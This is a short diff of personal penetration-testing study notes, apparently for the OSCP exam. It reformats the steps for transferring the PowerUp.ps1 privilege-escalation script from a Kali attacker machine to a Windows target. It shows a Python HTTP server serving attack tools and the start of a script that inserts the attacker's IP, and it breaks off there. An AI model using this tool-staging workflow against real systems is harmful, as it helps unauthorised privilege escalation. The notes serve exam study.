@@ -1,14 +1,11 @@
-
-Transfer PowerUp.ps1 from KALI ATTACKER to WINDOWS TARGET
+# Step 1 : Transfer PowerUp.ps1 from KALI ATTACKER to WINDOWS TARGET
 
 On KALI ATTACKER
 ```
 cd ~/Desktop/Tools/Windows && python -m http.server 80
 ```
 
-On WINDOWS TARGET
-
-Powershell (Modify Outfile Destination)
+# Step 2 : On WINDOWS TARGET: Powershell (MODIFY OUTFILE DESTINATION)
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
